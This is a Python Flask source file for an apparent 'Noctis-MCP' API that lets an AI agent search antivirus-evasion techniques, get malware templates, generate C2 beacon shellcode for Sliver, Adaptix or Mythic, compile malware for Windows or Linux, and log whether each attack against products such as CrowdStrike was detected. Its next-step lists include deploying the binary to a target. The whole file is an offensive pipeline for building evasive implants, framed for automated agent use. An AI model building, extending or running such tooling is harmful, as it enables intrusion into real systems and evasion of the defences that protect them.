"""
Noctis-MCP Agentic API
======================
Professional red team malware development endpoints.

Endpoints:
  POST /api/v2/search            - Search techniques using RAG
  POST /api/v2/recommend         - Get template recommendation
  POST /api/v2/generate_beacon   - Generate C2 beacon shellcode
  POST /api/v2/compile           - Compile malware for target OS
  POST /api/v2/record_result     - Record attack result for learning
"""

from flask import Blueprint, request, jsonify
import logging
from typing import Dict, Any, Optional
from pathlib import Path

logger = logging.getLogger(__name__)

agentic_bp = Blueprint('agentic', __name__, url_prefix='/api/v2')


def init_agentic_api(app, rag_engine):
    """Initialize agentic API with RAG engine"""
    agentic_bp.rag_engine = rag_engine
    app.register_blueprint(agentic_bp)
    logger.info("Agentic API initialized")


@agentic_bp.route('/search', methods=['POST'])
def search_techniques():
    """
    Search for techniques using RAG knowledge base.

    POST /api/v2/search
    {
        "query": "bypass CrowdStrike",
        "target_av": "CrowdStrike",
        "n_results": 10
    }

    Returns: Technique implementations with code snippets
    """
    try:
        data = request.json
        query = data.get('query', '')
        target_av = data.get('target_av', 'Windows Defender')
        n_results = data.get('n_results', 10)

        if not query:
            return jsonify({'error': 'query required'}), 400

        logger.info(f"[Search] query='{query}', target_av={target_av}")

        results = agentic_bp.rag_engine.search_knowledge(
            query=query,
            target_av=target_av,
            n_results=n_results
        )

        formatted_results = []
        for r in results:
            formatted_results.append({
                'content': r.get('content', r.get('document', '')),
                'source_file': r.get('metadata', {}).get('source', 'unknown'),
                'relevance_score': r.get('rerank_score', 0.5),
                'metadata': r.get('metadata', {})
            })

        return jsonify({
            'success': True,
            'query': query,
            'target_av': target_av,
            'results': formatted_results,
            'total_results': len(formatted_results)
        })

    except Exception as e:
        logger.exception(f"[Search] Error: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500


@agentic_bp.route('/recommend', methods=['POST'])
def recommend_template():
    """
    Get template recommendation based on objective.

    POST /api/v2/recommend
    {
        "objective": "C2 beacon to bypass CrowdStrike"
    }

    Returns: Template file, techniques, modification instructions
    """
    try:
        from server.utils.simple_recommender import recommend_template as get_recommendation
        from server.utils.simple_recommender import get_technique_files

        data = request.json
        objective = data.get('objective', '')

        if not objective:
            return jsonify({'error': 'objective required'}), 400

        logger.info(f"[Recommend] objective='{objective}'")

        recommendation = get_recommendation(objective)
        techniques = get_technique_files()

        return jsonify({
            'success': True,
            'objective': objective,
            'template': recommendation,
            'available_techniques': techniques
        })

    except Exception as e:
        logger.exception(f"[Recommend] Error: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500


@agentic_bp.route('/generate_beacon', methods=['POST'])
def generate_beacon():
    """
    Generate C2 beacon shellcode.

    POST /api/v2/generate_beacon
    {
        "c2_framework": "sliver",
        "listener_host": "10.0.0.1",
        "listener_port": 443,
        "architecture": "x64",
        "format": "shellcode"
    }

    Returns: Beacon shellcode and integration instructions
    """
    try:
        from c2_adapters.sliver_adapter import SliverAdapter
        from c2_adapters.adaptix_adapter import AdaptixAdapter
        from c2_adapters.mythic_adapter import MythicAdapter

        data = request.json
        framework = data.get('c2_framework', 'sliver').lower()
        listener_host = data.get('listener_host')
        listener_port = data.get('listener_port', 443)
        architecture = data.get('architecture', 'x64')
        output_format = data.get('format', 'shellcode')

        if not listener_host:
            return jsonify({'error': 'listener_host required'}), 400

        logger.info(f"[Beacon] framework={framework}, listener={listener_host}:{listener_port}")

        adapters = {
            'sliver': SliverAdapter,
            'adaptix': AdaptixAdapter,
            'mythic': MythicAdapter
        }

        if framework not in adapters:
            return jsonify({'error': f'Unsupported framework: {framework}'}), 400

        adapter = adapters[framework]()

        if not adapter.is_available():
            install_cmd = adapter.get_install_command()
            return jsonify({
                'success': False,
                'error': f'{framework.capitalize()} not installed',
                'install_command': install_cmd,
                'install_instructions': f'Run: {install_cmd}'
            }), 503

        result = adapter.generate_beacon({
            'listener_host': listener_host,
            'listener_port': listener_port,
            'architecture': architecture,
            'output_format': output_format
        })

        if not result.success:
            return jsonify({
                'success': False,
                'error': result.error_message
            }), 500

        return jsonify({
            'success': True,
            'framework': framework,
            'shellcode_path': result.shellcode_path,
            'shellcode_size': len(result.shellcode_bytes) if result.shellcode_bytes else 0,
            'integration_template': 'techniques/templates/beacon_stealth.c',
            'instructions': [
                f'1. Shellcode generated: {result.shellcode_path}',
                '2. Use beacon_stealth.c template',
                '3. Replace SHELLCODE_PLACEHOLDER with generated bytes',
                '4. Compile with noctis_compile()',
                f'5. Start listener on {listener_host}:{listener_port}'
            ]
        })

    except Exception as e:
        logger.exception(f"[Beacon] Error: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500


@agentic_bp.route('/compile', methods=['POST'])
def compile_malware():
    """
    Compile malware for target operating system.

    POST /api/v2/compile
    {
        "source_file": "malware.c",
        "target_os": "windows",
        "architecture": "x64",
        "optimization": "release"
    }

    Returns: Compiled binary path and compilation logs
    """
    try:
        from compilation.windows_compiler import WindowsCompiler
        from compilation.linux_compiler import LinuxCompiler

        data = request.json
        source_file = data.get('source_file')
        target_os = data.get('target_os', 'windows').lower()
        architecture = data.get('architecture', 'x64')
        optimization = data.get('optimization', 'release')

        if not source_file:
            return jsonify({'error': 'source_file required'}), 400

        source_path = Path(source_file)
        if not source_path.exists():
            return jsonify({'error': f'Source file not found: {source_file}'}), 404

        logger.info(f"[Compile] source={source_file}, target_os={target_os}, arch={architecture}")

        compilers = {
            'windows': WindowsCompiler,
            'linux': LinuxCompiler
        }

        if target_os not in compilers:
            return jsonify({'error': f'Unsupported target OS: {target_os}'}), 400

        compiler = compilers[target_os]()

        result = compiler.compile({
            'source_file': str(source_path),
            'architecture': architecture,
            'optimization': optimization
        })

        if not result['success']:
            return jsonify({
                'success': False,
                'error': result.get('error', 'Compilation failed'),
                'logs': result.get('logs', '')
            }), 500

        return jsonify({
            'success': True,
            'target_os': target_os,
            'architecture': architecture,
            'binary_path': result.get('output_file'),
            'file_size': result.get('file_size', 0),
            'compilation_logs': result.get('logs', ''),
            'next_steps': [
                '1. Test with noctis_test_detection()',
                '2. Deploy to target environment',
                '3. Record results with noctis_record_result()'
            ]
        })

    except Exception as e:
        logger.exception(f"[Compile] Error: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500


@agentic_bp.route('/record_result', methods=['POST'])
def record_result():
    """
    Record attack result for learning system.

    POST /api/v2/record_result
    {
        "template": "integrated_loader",
        "techniques": ["poolparty", "zilean"],
        "target_av": "CrowdStrike",
        "detected": false,
        "notes": "Bypassed successfully"
    }

    Returns: Success confirmation
    """
    try:
        from server.utils.learning import LearningTracker

        data = request.json
        template = data.get('template')
        techniques = data.get('techniques', [])
        target_av = data.get('target_av')
        detected = data.get('detected', False)
        notes = data.get('notes', '')

        if not template or not target_av:
            return jsonify({'error': 'template and target_av required'}), 400

        logger.info(f"[Record] template={template}, av={target_av}, detected={detected}")

        tracker = LearningTracker()
        tracker.record_attack(
            template=template,
            techniques=techniques,
            target_av=target_av,
            detected=detected,
            notes=notes
        )

        stats = tracker.get_stats(target_av=target_av)

        return jsonify({
            'success': True,
            'recorded': {
                'template': template,
                'target_av': target_av,
                'detected': detected
            },
            'stats': stats
        })

    except Exception as e:
        logger.exception(f"[Record] Error: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500
